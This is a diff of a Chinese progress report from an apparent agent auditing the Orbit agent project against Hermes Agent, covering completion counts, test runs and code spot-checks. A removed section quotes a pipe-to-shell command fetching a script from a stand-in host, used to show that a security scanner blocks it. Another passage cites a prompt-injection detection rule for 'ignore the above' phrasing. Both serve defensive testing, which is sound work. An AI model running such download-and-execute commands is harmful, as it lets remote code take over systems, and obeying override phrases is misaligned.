@@ -1,302 +1,306 @@
 # 对标进度报告
 
-**更新时间**：2026-10-28 12:05（本机实测时钟，只读取证）
-**本轮轮次**：**N = 8**
-**性质**：只读核对。未修改任何代码 / research / MATRIX / ROADMAP 文件；未装依赖；未启动后端；未跑会改状态或真发请求的命令。
-**基准**：Hermes Agent runtime 0.21.0-cn.18 · **目标仓**：Orbit `E:\bbbooottt`（HEAD `5c7d534`；**轮初工作树干净，轮末出现 4 个未跟踪新文件，见 R1**）
+**更新时间**：2026-10-28 12:48（本机实测时钟，只读取证）
+**本轮轮次**：**N = 9**
+**性质**：只读核对。未修改任何代码 / research / MATRIX / ROADMAP 文件；未装依赖；未启动后端；未跑会改状态或真发请求的命令（`orbit setup` / `config edit` / `doctor --fix` / `cron run` / `gateway start` / `backup restore` 全部未运行）。
+**基准**：Hermes Agent runtime 0.21.0-cn.18 · **目标仓**：Orbit `E:\bbbooottt`（HEAD `a693224`；**轮初工作树干净，轮末出现 2 个在飞改动，见 R1**）
 
 ---
 
 ## 总体完成度
 
-### **112 / 181 项 = 61.9%**
+### **127 / 181 项 = 70.2%**
 
 | 项 | 说明 |
 |---|---|
-| 权威口径 | **读「状态」列**（第 5 个 `\|` 段），且**先替换转义竖线 `\|` 再切段** |
-| 完成 / 部分 / 未开始 | **✅ 112 · 🟡 45 · ⬜ 24**（112+45+24 = 181 ✓ **总数对得上**） |
-| 与 `matrix_stats --check` 一致性 | 工具输出「181 项 · ✅112 · 🟡45 · ⬜24（61.9%）」exit 0 —— **与我独立解析逐字一致** ✅ |
-| 格式合法性 | 我另跑一遍校验：**181 行状态列全部合法**，且**没有任何一行出现第二个状态符号**（上轮 10.1 的污染已清除） |
+| 权威口径 | 读「状态」列（先替转义竖线 `\|` 再切段） |
+| 完成 / 部分 / 未开始 | **✅ 127 · 🟡 46 · ⬜ 8**（127+46+8 = 181 ✓） |
+| 与 `matrix_stats --check` 一致性 | 工具输出「181 项 · ✅127 · 🟡46 · ⬜8（70.2%）」exit 0 —— **与我独立解析逐字一致** ✅ |
+| 格式合法性 | 181 行状态列**全部合法**，**无任何一行出现第二个状态符号** ✅（门禁持续生效） |
+| 剩余 ⬜ 清单 | 我独立列出的 8 条 = `2.1 / 5.7 / 5.14 / 7.16 / 7.18 / 8.7 / 8.10 / 9.14` —— **与你给的清单逐条相同** ✅ |
 
-> **上轮我报的两个缺陷，你这轮修得比我的建议更彻底**：
-> 1. `status_of()` 现在**先替掉 `\|` 再切段**（`matrix_stats.py:52-53`）——这正是 **5.9 / 5.10 被静默漏掉**的根因（`iwr\|iex` 把状态列右移一格读成 `'W13'`）。我上轮只发现了"整行包含"那一层，**没发现转义竖线这第二层**；你能抓出来是对的。
-> 2. `status_column_problems()`（`:76`）实现了两条门禁，docstring 还**逐字记录了我的措辞如何污染了 10.1**（`:17-18`）。这是把教训写进代码而不是写进聊天记录——比修 bug 本身更有价值。
+> 记账提示：我上轮实测是 **112（61.9%）**，你这次写「64.1% → 70.2%」。中间那 4 条（112→116）是我上轮报告之后、本轮波次之前落地的，我这轮没有复核它们——**本轮我只对「116→127」这 11 条负责**。
 
-### 硬口径
+### 硬口径：**全部对上**
 
 | 你的口径 | 我的实测 | 判定 |
 |---|---|---|
-| `REGISTRY` 81 顶层 / 364 二级 / 39 三级 = 484 | **81 / 364 / 39 = 484** | ✅ 一致 |
-| done 255 / partial 22 / todo 207 | **255 / 22 / 207**（合计 484 ✓） | ✅ 一致 |
-| pytest 1 failed, 2043 passed, 1 skipped | **1 failed / 2043 passed / 1 skipped（191.15s）** | ✅ 一致（你 183.24s） |
+| `REGISTRY` 81 顶层 / 386 二级 / 39 三级 = 506 | **81 / 386 / 39 = 506** | ✅ 一致 |
+| done 290 / partial 28 / todo 188 | **290 / 28 / 188**（合计 506 ✓） | ✅ 一致 |
+| pytest 1 failed, 2303 passed, 1 skipped | **1 failed / 2303 passed / 1 skipped（200.17s）** | ✅ 一致（你 198.86s） |
 | 唯一失败 = 既有 `test_connectors::test_browser_append_and_reload` | 正是它 | ✅ 一致 |
 | ruff `All checks passed!` | **All checks passed!**（exit 0） | ✅ 一致 |
-| `matrix_stats --check` 181 · ✅112 · 🟡45 · ⬜24 exit 0 | **完全一致**，exit 0 | ✅ 一致 |
-| mypy **120** files clean | **122 files，2 errors**（都在 `metrics_schema.py`） | ⚠️ **见 R1：差异来自轮中落地的未跟踪文件，已提交树仍 clean** |
+| mypy **135** files clean | **135 files, Success**（exit 0） | ✅ 一致 |
+| `matrix_stats --check` exit 0 | **exit 0** | ✅ 一致 |
+
+**上轮三条建议，我逐条复核了落地情况：**
+
+| 上轮建议 | 本轮实测 | 状态 |
+|---|---|---|
+| 修 `metrics_schema.py` 的 2 个 mypy 错误 | **135 文件 clean** —— 错误消失，且文件数从 122 涨到 135（那 2 个在飞文件已提交） | ✅ **已修** |
+| 10.5 的「177,015」换成可复现数字 | MATRIX 现写「64 会话 → 46 份，2,505,095 → 1,858,947 字节，省 18 份 / 646,148 字节」，**与我上轮的只读实测逐字相同**，并注明「先前照抄子agent 自述，复现不出来，**已作废**」 | ✅ **已修，且改法正确** |
+| L2 计数 ✅6/🟡3/⬜1 | 本轮实测 L2 = **✅6 · 🟡3 · ⬜1 = 10** | ✅ **已修** |
 
 ---
 
 ## 分层完成度
 
-（状态列口径，转义竖线已处理）
-
 | 层 | 完成/总数 | 百分比 | 状态 |
 |---|---|---|---|
-| L1 入口 / CLI | 10 / 18 | 55.6% | 🟡5、⬜3 |
-| **L2 Agent 核心循环** | **6 / 10** | **60.0%** | **本轮从 ✅1 → ✅6**（🟡3、⬜1） |
-| **L3 上下文装配** | **8 / 8** | **100%** | **✅ 仍完整，未被本轮改动破坏** |
-| L4 模型适配 | 6 / 13 | 46.2% | 🟡4、⬜3 |
-| L5 工具层 | 13 / 19 | 68.4% | 本轮 +2（🟡4、⬜2） |
-| L6 工具集 / 注册 | 3 / 5 | 60.0% | 🟡2 |
-| L7 Skill / curator | 13 / 18 | 72.2% | 本轮 +4（🟡3、⬜2） |
+| L1 入口 / CLI | 13 / 18 | 72.2% | 🟡5、⬜0 |
+| L2 Agent 核心循环 | 6 / 10 | 60.0% | 🟡3、⬜1 |
+| **L3 上下文装配** | **8 / 8** | **100%** | **✅ 仍完整（你让我确认的那条）** |
+| L4 模型适配 | 8 / 13 | 61.5% | 🟡5、⬜0 |
+| L5 工具层 | 13 / 19 | 68.4% | 🟡4、⬜2 |
+| L6 工具集 / 注册 | 3 / 5 | 60.0% | 🟡2、⬜0 |
+| L7 Skill / curator | 13 / 18 | 72.2% | 🟡3、⬜2 |
 | L8 MCP | 6 / 10 | 60.0% | 🟡2、⬜2 |
-| L9 记忆层 | 8 / 16 | 50.0% | 🟡3、⬜5 ← **剩余最大块** |
-| L10 持久化 / 会话 | 9 / 15 | 60.0% | 本轮 +4（🟡5、⬜1） |
-| L11 cron | 3 / 6 | 50.0% | 🟡2、⬜1 |
-| L12 Gateway / 多平台 | 7 / 11 | 63.6% | 🟡3、⬜1 |
-| L13 插件 | 5 / 10 | 50.0% | 🟡4、⬜1 |
+| L9 记忆层 | 11 / 16 | 68.8% | 🟡4、⬜1 |
+| L10 持久化 / 会话 | 10 / 15 | 66.7% | 🟡5、⬜0 |
+| **L11 cron** | **6 / 6** | **100%** | **🎉 本轮补齐** |
+| L12 Gateway / 多平台 | 8 / 11 | 72.7% | 🟡3、⬜0 |
+| L13 插件 | 5 / 10 | 50.0% | 🟡5、⬜0 |
 | L14 安全 / 审批 | 6 / 10 | 60.0% | 🟡4、⬜0 |
-| L15 可观测性 | 4 / 6 | 66.7% | ⬜2 |
-| L16 Web UI / 前端 | 5 / 6 | 83.3% | 🟡1 |
-| **合计** | **112 / 181** | **61.9%** | — |
+| **L15 可观测性** | **6 / 6** | **100%** | **🎉 本轮补齐** |
+| L16 Web UI / 前端 | 5 / 6 | 83.3% | 🟡1、⬜0 |
+| **合计** | **127 / 181** | **70.2%** | — |
 
-**L3 = 8/8 = 100% 仍完整** ✅（你让我顺手确认的那条：未破坏）。
-**L2 从 10% → 60%**，是本轮涨幅最大的一层，也是我上轮建议的直接结果。
+**现在有三层 100%**：**L3 上下文装配（8/8）**、**L11 cron（6/6）**、**L15 可观测性（6/6）**。
+**8 个整层零 ⬜ 的层**：L1 / L4 / L6 / L10 / L11 / L12 / L13 / L14 / L15 / L16（只剩 🟡）。
 
 ---
 
 ## 本轮抽查证据
 
-**抽样率**：本轮 15 条转 ✅ 中**复核 11 条（73%）**；两处披露 **全部复核**；`test_graph` 竞态更正 **独立复现**。
+**抽样率**：本轮 11 条转 ✅ 中**复核 9 条（82%）**；你点名的 7 条**全部复核**；两处主动交代**全部复核**；另按你的要求抽查了「同名不同语义」这一类。
 
-### A. 你点名的 7 条，逐条判定
+### A. 你点名的 7 条，逐条判定 —— **7/7 全部撑得住**
 
-**① 10.12 双 FTS5 → ✅✅ 独立库、不动 schema、选表策略与代码一致**
+**① 9.12 写入门禁「已接线」→ ✅✅ 接线与拦截都验证了（端到端 CLI 差最后一步）**
 
+**接线**（`tools.py`）：
 ```
-session_index.py:1     """会话检索的双 FTS5 索引：独立 ``fts.sqlite``，中文与英文各走一条路。"""
-session_index.py:15-16 1. 在 app.sqlite 里加 FTS5 虚表 + 触发器 → **改 schema，禁改区**；
-                       2. 另开 <data_dir>/fts.sqlite，由本模块**主动**增量同步。
-session_index.py:79    #: 索引库文件名（与 app.sqlite 同级，但**完全独立**）。
-session_index.py:439   """丢掉索引库重来一遍（**不动 app.sqlite**）。"""
-session_index.py:277   "删掉它不会丢任何消息，消息真相源在 app.sqlite"
+:17    from app import approvals, code_exec, egress, memory_write, terminal, tirith, toolsets
+:1735  allowed, refusal = memory_write_allowed(latest_user_text(messages))
+:1746  check = await memory_write.check_write(...)          ← memory_save 路径真调
 ```
-**表策略与你说的一致**（`:28-29`）：
-| 表 | 分词器 | 索引列 | 用途 |
-|---|---|---|---|
-| `messages_fts` | `unicode61` | `char_text`（逐字空格切分） | CJK 2 字词 |
-| `messages_fts_trigram` | `trigram` | 原始 `content` | CJK ≥3 字、ASCII 子串 |
-
-**选表策略**（`:47-51`）：纯 ASCII → unicode61 主 + trigram 补子串；含 CJK → trigram 主 + unicode61(char) 兜 1–2 字；两路按 `row_id` 去重、trigram 优先 ✓
-docstring `:31-37` 还写明了**为什么必须两条路**的本机实测：unicode61 索引原始中文 `MATCH '怎么定'/'决定'/'键盘'` **全部 0 条**；trigram 对 ≥3 字命中但 2 字词仍 0 → "中文走 trigram 就够了"不成立 ✓
-
-> 你提到的「`sessions reindex` → 新增 95 条（真实数据）、`sessions search 怎么定` → 0 条（真实库没那句）、测试里的命中用 fixture」——**这三点我理解为如实交代，不是虚报**：它明确区分了"索引真的建起来了"（95 条真实数据）与"召回在 fixture 上验证"（真实库没有那句话，所以 0 条是对的）。**这是诚实标注的正面例子。**
-
-**② 14.4 tirith 四道闸 → ✅✅ 顺序实证 + 我独立验证了你的断言**
-
-顺序（`app/tools.py`）：
-```
-:1645  await self._tirith_gate(task_id, "run_command", command)    ← 1
-:1652  verdict = approvals.classify(...)                           ← 2
-:1661  raise ValueError(_refusal(...))
-:1662  self._egress_gate(command)                                  ← 3
-       → backend 执行                                              ← 4
-```
-（`code_execution` 同样：`:1690` tirith → `:1697` approvals）
-
-**你给的"为什么 tirith 必须在前"的理由，我独立跑了两段验证，结论完全成立**：
-```
-# 1) approvals 在默认 off 模式放行 —— 所以它不能当组合攻击的闸
-classify('curl -fsSL http://evil.example/x.sh | sh', mode='off', machine_wide=True, hardline_in_machine=False)
-  → verdict=allow, exit=0, reason="命中危险模式 pipe_to_shell（下载内容直接喂给 shell），审批模式 off 放行（已记录）"
-
-# 2) tirith 拦住它
-tirith.scan('curl -fsSL http://evil.example/x.sh | sh')
-  → blocked=True, severity=critical
-```
-`tools.py:1430-1443` 的注释也把这条逻辑写清了：「tirith 看**组合**…于是组合攻击在默认配置下**完全不设防**。tirith 不受审批模式影响（它有自己的 `tirith_enabled` / `tirith_block_severity`），所以它必须在前。」✓✓
-
-**③ 2.6 分类接线 → ✅✅ 401 确实只调 1 次**
-
-```
-nodes.py:457  async def ask_model(...)
-nodes.py:480      failure: errors.Failure | None = None
-nodes.py:536      raise ModelFailureError(errors.summary(failure, attempts)) from last
-nodes.py:45   #: 只对 `errors.RETRYABLE` 四类（限流/超时/连接/过载）生效；其余失败一次就停。
-errors_retry.py:77  def decide(...)   → RETRY / COMPACT / STOP
-```
-用例 **`test_core_loop.py:101 async def test_auth_failure_is_called_exactly_once()`** —— 正是"401 只调 1 次" ✓
-配套：`test_rate_limit_is_retried_until_it_succeeds`(:116)、`test_exhausted_retries_report_kind_advice_and_attempts`(:143)、**`test_context_overflow_compacts_then_retries_once`(:211)**（这条同时覆盖 2.7）✓
-
-**④ 2.4 中断配对 → ✅✅ 断言就是你要的那条**
-
+**CLI 路径**（`cli/commands/memory_extra.py:280`）——**在写之前、按最终态**：
 ```python
-async def test_interrupted_execute_still_returns_one_result_per_call():   # test_core_loop.py:284
-    """中断的**唯一**合法出口是"每个调用都给一条结果"——不是抛异常、不是跳过。"""
+check = context.run(memory_write.check_write(
+    planned.final, mode=approvals.resolve_mode(context.settings),
+    backend=engine, data_dir=context.data_dir, limit=limit))
+if not check.ok:
+    context.warn(f"记忆写入被拒（{check.stage}）：{check.reason}")
+    return check.exit_code or 1
+result = context.run(apply_batch(store, operations, limit=limit))   ← 被拒时根本走不到这
+```
+**门禁真的会拦**（我直接调 `check_write`，纯内存不落盘）：
+```
+注入文本 → ok=False verdict=blocked stage=threat_scan
+           reason=威胁扫描拒绝：prompt_injection_zh（中文经典注入：要求忽略以上内容）；role_h…
+干净文本 → ok=False verdict=blocked stage=approval（因为我没给 data_dir，smart 模式要暂存——预期行为）
+```
+**退出码链路**：`memory_write.EXIT_CODES = {allow: 0, staged: 2, **blocked: 3**}` → `return check.exit_code or 1` = **3** ✓
+
+> ⚠️ **端到端 CLI 实跑未完成**（如实标注）：`orbit memory batch --file <注入>` 在**全新 `--data-dir`** 下会先撞上「数据库不存在：…app.sqlite（先运行 `orbit setup`）」，而 `orbit setup` 属改状态命令 → 我没有跑。**已核到的是：门禁逻辑（in-process）+ 调用点（写之前）+ 退出码映射（blocked→3）三段完整**，缺的只是"在真库上跑一遍"这一步。
+> 附带发现：`memory batch` 对带 BOM 的 JSON 会**明确报错**（"operations 不是合法 JSON：Unexpected UTF-8 BOM"）而不是静默当空——这是好的错误处理，不是缺陷。
+
+**② 10.14 事件溯源 → ✅✅ 三处都真**
+
+```
+event_log.py:11  seq   <data_dir>/events/<stream>.jsonl 里**每流独立**的自增整数
+event_log.py:17-21  ## 游标必须是 seq，不能是时间戳
+                    同毫秒时间戳完全相同，用 ts > cursor 增量读会把它们**一起漏掉或一起重复**
+def since(stream, cursor=0):   fresh = [i for i in read_all(stream) if _as_int(i["seq"]) > floor]
+```
+- **每流独立单调** ✓（`:11` + `since` 按 `seq > cursor` 过滤）
+- **游标是 seq 不是时间戳** ✓（`:17-21` 明确写了理由；`since` 实现就是 `seq > floor`）
+- **`compact` 记下被丢 seq 区间** ✓：
+```python
+def compact(stream, keep):   # 返回 {stream, dropped, dropped_from, dropped_to, kept, compaction_seq}
     ...
-    # 核心不变量：tool_calls 条数 == ToolMessage 条数。
-    assert tool_calls == len(tool_messages) == 2
-    assert retry.missing_tool_results(merged) == []
+    marker_payload = {"kind": KIND_COMPACTED, "stream":..., "dropped":..., "dropped_from": first_seq, ...}
 ```
-✓✓ 精确命中。配套 `test_repair_fills_missing_tool_results`(:271)、`test_interrupted_result_has_the_documented_shape`(:264)、`test_interrupted_thread_does_not_call_the_model_again`(:311)。
+且「没裁过就**不写压缩事件**——没裁过就不该在审计里留下'这里被裁过'的假痕迹」✓ 这条很硬。
 
-**⑤ 5.17 code_execution 子进程 → ✅✅ 断言 `os.getpid()`**
+**③ 11.3 cron 投递 → ✅✅ 真在 `create` 时拒**
 
-```
-code_exec.py:125  return [sys.executable, "-c", code]
-code_exec.py:178  process = subprocess.Popen(  # noqa: S603 - argv 是显式列表，不经 shell
-```
-用例 **`test_code_exec.py:42 test_code_never_runs_in_the_host_process`**：
 ```python
-result = code_exec.run_code("import os; print(os.getpid(), flush=True); os._exit(0)")
-assert int(result.stdout.strip()) != os.getpid()
+def validate_deliver(deliver):
+    """…**未实现的平台在 ``create`` / ``edit`` 就被拒**（调用方都是先校验再落盘），
+       而不是等到任务跑起来才失败：那时用户已经等了半小时。"""
+    ...
+    if value.startswith(DELIVER_PLATFORM_PREFIX):
+        reason = _platform_rejection(platform_name)
+        if reason:
+            raise ValueError(reason)          ← create 阶段直接抛
 ```
-✓✓（比"pid 不变"更强：子进程 pid 与宿主**不同**，且子进程里 `os._exit` 不会带走宿主）
-配套 `test_timeout_kills_the_whole_process_tree`(:103)、`test_execute_goes_through_tirith`(:196)、`test_execute_goes_through_the_hardline_approvals`(:183)。
+✓✓ 而且理由写得很好：「静默接受一个没实现的平台会让用户以为"输出已经发到群里了"，实际什么都没发——定时任务的失败模式里，"以为发了"比"明确没发"贵得多」。
 
-**⑥ 10.5 内容寻址 → ⚠️ 机制 ✅ / 那个数字 ❌ 复现不出来（你的怀疑是对的）**
+**④ 11.6 级联停止 → ✅✅ 真管 3 个子系统 + 真只标记**
 
-**机制部分完全成立**：`PromptStore` 在 `app/session_archive.py:256`（不是 `system_prompts.py`）：
+```python
+def pause_all(data_dir, *, reason=""):
+    """紧急停止级联：cron 哨兵 + gateway 哨兵 + 正在跑的任务（只标记）。
+    三个子系统，为什么都得管：
+    - cron：挡"下一轮 tick 不开始"；
+    - gateway：挡"新网关轮次与出站投递"——只停 cron 等于停了半台机器；
+    - 正在跑的任务：已经开始的那一轮在**别的进程**里，只能打标记让它自己退。
+      跨进程强杀（taskkill / 信号）会引入"杀错 PID / 杀掉外部调度器"的风险，
+      那比"多跑完这一轮"贵得多。"""
 ```
-:257  """``system_prompts`` 的 Orbit 版：``sha256`` → 文件，任务只记 hash。"""
-:282  """存一份提示词正文，返回 sha256。**同一内容只落一份文件**。"""
-:290  digest = hashlib.sha256(data).hexdigest()
-:45   read 时重算 sha256，不符就抛 PromptMismatch
+代码：`store.set_paused(True)` + `running.mark_cancelled(reason=...)` + `_gateway_pause_paths` / `write_json` ✓
+另：`CascadeStatus.paused` 是「**任一**子系统仍停着就算停着」而不是"全部停着"——理由「漏停一个子系统（比如 gateway 还在发消息）比多报一次'还停着'危险得多」✓ 这个方向选对了。
+
+**⑤ 15.4 / 15.5 → ✅✅ 两处都真**
+
+**15.4 `available=false` 必须写 source/help**：
+```python
+# metrics_schema.py
+# 不可用时**必须**有 source 或 help 说明为什么——空着等于没说。
+if not item["available"]:
+    _check(bool(item.get("source") or item.get("help")),
+           f"v2 的指标 {name} 标了不可用，却没写 source/help 说明原因")
 ```
-`session_plane.py:71-72` 也有对应的事件记账说明 ✓
+✓ 而且 `available=true` 时反向要求有数字 `value` ✓
 
-**但「本机 Hermes 数据实测：27 会话 → 22 份，894,988 → 717,973 字节，省 5 份 / 177,015 字节」我复现不出来。**
-我用**只读**方式（`mode=ro&immutable=1`）直接查本机 Hermes 的 `state.db`：
+**15.5 `flush()` 真抛错 + 钩子 11 条**：
+- `exporters.py:33`「Hermes `plugins/observability/langfuse/plugin.yaml` 里的 hooks 清单（**11 条**）」
+- 实测 `LANGFUSE_HOOKS` = **11**：`pre_api_request, post_api_request, api_request_error, pre_llm_call, post_llm_call, pre_tool_call, post_tool_call, on_session_finalize, on_session_end, subagent_start, subagent_stop` ✓
+- `flush()` 在 `:214-221` **`raise NetworkUnavailable(...)`** —— 不是返回假成功 ✓✓
 
-| 指标 | MATRIX 写的 | 我实测 |
+**⑥ 4.10 三级能力元数据 → ✅✅ 七字段真的全 None**
+
+`app/capabilities.py::resolve(model, provider, ...)`（不是我一开始猜的 `model_capabilities`）。用例：
+```python
+def test_unknown_model_returns_none_for_every_field():        # test_capabilities.py:124
+    assert result.value(name) is None, f"{name} 不许有默认值"   # ← 逐字段断言，不是抽查一个
+    assert payload["context_window"] is None
+    assert payload["supports_tools"] is None
+```
+✓✓ **「不许有默认值」被写进了断言消息**，这正是你要的那个形状。
+
+**⑦ 9.11 HRR → ✅✅ 权重与 0.78 串扰都有用例钉住**
+
+`app/holographic.py`（不是 `memory_graph.py`——后者 docstring `:12` 明说"HRR 那套**再换实现**"，是另一件事）：
+- `DIM = 1024`（实测 `H.DIM = 1024`）✓
+- 权重 **fts 0.4 / jaccard 0.3 / hrr 0.3**（`:18-20,63`）✓
+- `encode` 用 `hashlib` 派生种子做确定性伪随机相位（**不用 `random`**，要可复现）、`bind`/`unbind` 用 FFT ✓
+- **用例**：`test_weights_are_forty_thirty_thirty`(:100) · `test_each_signal_contributes_its_own_weight`(:106) · `test_score_is_exactly_the_weighted_sum_of_its_three_signals`(:113) ✓
+- **0.78 串扰**：`test_multi_token_bind_unbind_is_approximate_not_exact`(:73)，docstring「多词叠加后 bind→unbind 有串扰（实测 ≈0.78）：这是 HRR 的统计性质，不是 bug」✓✓
+
+### B. 你的两处主动交代
+
+**① 9.16 的研究错误 → ✅ 更正准确，我独立复核了 13 这个数**
+
+MATRIX 现在写：「Hermes 的 `profile` **不是用户画像**，而是 **profile distribution（可切换的发行版配置）管理器**，且是 **13** 条子命令不是 14」。
+**我从 `research/_raw/sub/profile__*.txt` 独立数**：共 **13** 个文件 —— `alias, create, delete, describe, export, import, info, install, list, rename, show, update, use`，**与你列的 13 条逐条相同** ✓✓
+状态也诚实：🟡 + 「distribution 那 10 条仍 todo——把它们做成画像增删改就是抄错语义」✓
+
+**这是本轮最值得记的一条**：一个从**研究阶段**就存在的语义错误，被子agent 在实现时顶回来。**错误在被发现前已经存在了 8 轮**，而它不会表现为任何测试失败或计数异常——**只能靠人/agent 对着上游 help 逐字读出来**。
+
+**② 「如实说没有 ≠ 有」这条规矩 → 已落地，且当场抓到 4 条**
+
+你抓的 4 条我抽核了 2 条，都成立：
+- **记忆写入门禁**：现在 `check_write` 真的在 `memory_save`（`tools.py:1746`）与 `memory batch`（`memory_extra.py:280`）两处，且注入文本实测 `blocked / threat_scan / prompt_injection_zh` ✓
+- **`egress` 6 条**：上轮我核过 = `install/start/stop/restart/reload/disable` 为 `partial` ✓
+- 另外两条（`profile show` 的 `_BOUND` 重绑、你自己写错 `Context` API）我未单独复核，如实标注。
+
+### C. 按你的要求抽查「同名不同语义」这一类 —— **发现 1 条：7.17**
+
+你点名要核 `journey` / `plane` / `session` / `memory-graph`，结果如下：
+
+| 名字 | Hermes 侧 | Orbit 侧 | 判定 |
+|---|---|---|---|
+| `journey` / `learning` / `memory-graph` | **三个是同一命令的别名**（我核过：去掉 `### CMD` 头行后三份 help **完全相同**） | 注册为 `journey` + `aliases=('learning','memory-graph')` ✓；`hermes='journey'` | 别名关系**对** |
+| `plane` | Hermes **无**此命令 | `hermes=''`（空）→ 明确标为 Orbit 自有 | ✓ 不占位 |
+| `session-search` | Hermes **无**此命令 | `hermes=''` ✓ | ✓ 不占位 |
+| `sessions` | 19 子命令 | 26 子命令、`state=partial` | ✓ 如实标 partial |
+
+**但 `journey` 的语义有一处差异，MATRIX 没标出来** ⚠️：
+- **Hermes**：`delete` = 「Delete a learned skill (archived) or **memory** by node id」；`edit` = 「Edit a learned skill or memory by node id **in $EDITOR**」——**真的删、真的编辑**
+- **Orbit**：`journey.py` 的 `edit(id, note)` / `delete(id)` **只写 `journey-notes.json`**，usage 与 ledger 字节不变（第 7 轮我核过，`journey.py:29,36` 明写「绝不回写 `.usage.json` 或 ledger」「一个字节都不动」）
+
+→ **语义是"标注"而不是"删除/编辑"**。这个取舍本身**是对的**（审计不可篡改，理由写在模块 docstring 里），但 MATRIX 7.17 标的是 **✅**，证据栏只写了 Orbit 做了什么，**没有把它标为与 Hermes 的差异**。
+**建议**：7.17 在证据栏加一句「**差异**：Hermes 的 `delete`/`edit` 真删/真编辑；Orbit 只写旁注 + 墓碑标记（审计不可篡改的取舍），语义是"标注"而非"删除"」——或者降为 🟡。**这正是你担心的那一类，只是它是"行为差异未标注"而非"数字错"。**
+
+### D. 其余复核
+
+| 条目 | 证据 | 判定 |
 |---|---|---|
-| 有 system_prompt 的会话 | 27 | **64** |
-| 去重后唯一提示词 | 22 | **46** |
-| 逐会话合计 | 894,988 字节 | **2,505,095 字节** |
-| 去重后 | 717,973 字节 | **1,858,947 字节** |
-| 省下 | 5 份 / 177,015 字节 | **18 份 / 646,148 字节** |
-
-（该数字**算术自洽**：894,988 − 717,973 = 177,015、27 − 22 = 5，所以不是随手编的；但**与现库不符**——可能是子agent 用了某个更窄的口径（比如只看带 hash 列的、或某个时间窗），而那个口径没写下来。）
-
-**判定：这个数字目前不构成独立证据。** 建议三选一：① 把子agent 用的确切查询写进证据栏；② 直接换成可复现的 646,148 / 18 份；③ **删掉数字、只留机制**——机制那半是代码可查的，本来就不需要这个数字撑。
-
-**⑦ L7 的 7.6 / 7.12 / 7.14 / 7.17 → ✅✅ 四条全部精确**
-
-| 条目 | 实测 |
-|---|---|
-| **7.6** 12 条规则 | `skill_lint.RULES` = **12**，severity 分布 **`{'error': 2, 'warning': 10}`** ✓✓ 正是 2 ERROR + 10 WARNING |
-| **7.12** quarantine | `skill_hub.py:35`「放行条件写死为**零 critical**（`GUARD_CRITICAL`）。high/medium 只记录」；`:37-38`「`release()` **不能绕过 critical**（重扫一次，仍 critical 就仍然拒绝）」✓✓ |
-| **7.14** bundles | `bundles.py`：`Bundle`(:68) / `Bundles`(:119) / `ReloadReport`(:109) / `BundlesError`(:59) —— 真实现，不是空登记 ✓ |
-| **7.17** journey | `journey.py:29`「（旁注 + 墓碑标记），**绝不回写 `.usage.json` 或 ledger**」；`:36`「`.usage.json` 与 ledger **一个字节都不动**」✓✓ |
-
-### B. 你的两处主动交代 —— 都复核成立
-
-**① `session_extra` 导入顺序 → ✅ 你的表述与 `__init__.py` 现状完全一致**
-
-`app/cli/commands/__init__.py` 现在是三组：
-```python
-from app.cli.commands import (...)          # isort: split   ← 第一组：真实现，含 setup
-# ── 第二组：**必须在表组装之后**导入的模块 ──
-from app.cli.commands import (
-    hermes_parity,   # noqa: F401
-    session_extra,   # noqa: E402,F401
-)
-from app.cli.commands.tools_extra2 import mark_proxy_paths_partial  # noqa: E402
-```
-注释里**逐字写着你的规则**：「**替换顶层命令的模块必须排在 `hermes_parity` 之前；只往已有父节点挂子命令的模块可以排在之后**。这是唯一一个"之后"的例子。」
-**行为验证**：`setup` 正常注册（`handler=run_setup`、`subcommands=0`、`state=done`），**没有** `命令重复登记：setup` —— 我这一整轮跑的每一条 `orbit` 命令都没报这个错，说明 CLI 起得来 ✓
-
-**② `egress` 6 条被校正为 `partial` → ✅ 精确对上**
-
-`orbit egress` 共 13 子命令，实测状态：
-| partial（6 条，iron-proxy 生命周期） | done（7 条） |
-|---|---|
-| `install` `start` `stop` `restart` `reload` `disable` | `setup` `status` `config` `policy` `allow` `deny` `check` |
-
-`__init__.py` 里那段状态校正的注释也把理由写清了：「只是'如实报告 Orbit 没有这一层'，功能本身没实现。但 `Spec.build()` 见到有 handler 就标 `done`，于是'如实说没有'被算成'有'。」✓✓
-
-> **你点出的这类虚报值得单独立一条规矩**：「**如实说没有 ≠ 有**」。它比"没做却说做了"更隐蔽，因为命令确实有输出、exit code 也可能是 0。**我下轮开始会专门抽查这一类**：凡是 `done` 的命令，都要看它的输出是"真的做了"还是"解释为什么没做"。
-
-### C. `test_graph` 竞态更正 —— **我第 3–7 轮的判断是错的，本轮更正**
-
-`app/agent.py` 里现在有明确记录：
-```
-:324  async def enqueue(self, task_id: str, resume: dict | None = None):
-:327      为什么不能直接 `return`（原来的写法）：任务进入 `WAITING_USER` 时，状态…
-:330      此时 `task_id in self.current` 仍为真，那次 enqueue 会被**静默丢弃**：
-:332      （`tests/test_graph.py::test_ask_user_still_interrupts_and_resumes` 偶发挂死）。
-:339      deferred = asyncio.create_task(self._enqueue_after(job, task_id, resume))
-:351  async def _enqueue_after(self, job, task_id, resume):   → await self.enqueue(...)
-```
-**代码注释直接点名了那条用例**，修复是"延后到当前 job 结束后再 enqueue"。
-
-**独立复现**：我把该用例隔离连跑 3 次 → **1 passed in 4.21s / 3.73s / 3.16s**，全部通过，且比第 6 轮我测到的 5.70s 更快。
-
-**更正记录**：我在第 3 / 5 / 6 / 7 轮反复把 `test_ask_user_still_interrupts_and_resumes` 的偶发挂死记为「**负载敏感、非回归**」。**这个判断是错的**——它是 `WAITING_USER` 窗口内 `enqueue` 静默丢弃 resume 的**竞态**。我当时依据的是"隔离跑必过"，但**竞态同样会表现为"隔离跑必过、并发跑偶发挂"**，所以"隔离通过"不能用来排除竞态。这是我这 8 轮里最实质的一次误判，已在本报告更正。
+| 7.14 bundles | `orbit bundles` 实测 5 子命令 `list/show/create/delete/reload`，`state=done`；`bundles.py` 有 `Bundle`/`Bundles`/`ReloadReport` | ✅ |
+| L3 未被破坏 | 8/8 = 100%（独立解析） | ✅ **确认** |
+| 8 条剩余 ⬜ | 独立列出与你给的清单**逐条相同** | ✅ |
+| `memory batch` 的 BOM 处理 | 带 BOM 的 JSON → 明确报错而非静默当空 | ✅ 好行为 |
 
 ---
 
 ## 与目标标志的差距
 
-### Top 10 未完成项
+只剩 **8 条 ⬜**，逐条列（这是离「Hermes 有的 Orbit 都有」的最后硬缺口）：
 
-| # | 未完成项 | 现状 | 量级 |
+| # | 条目 | 内容 | 备注 |
 |---|---|---|---|
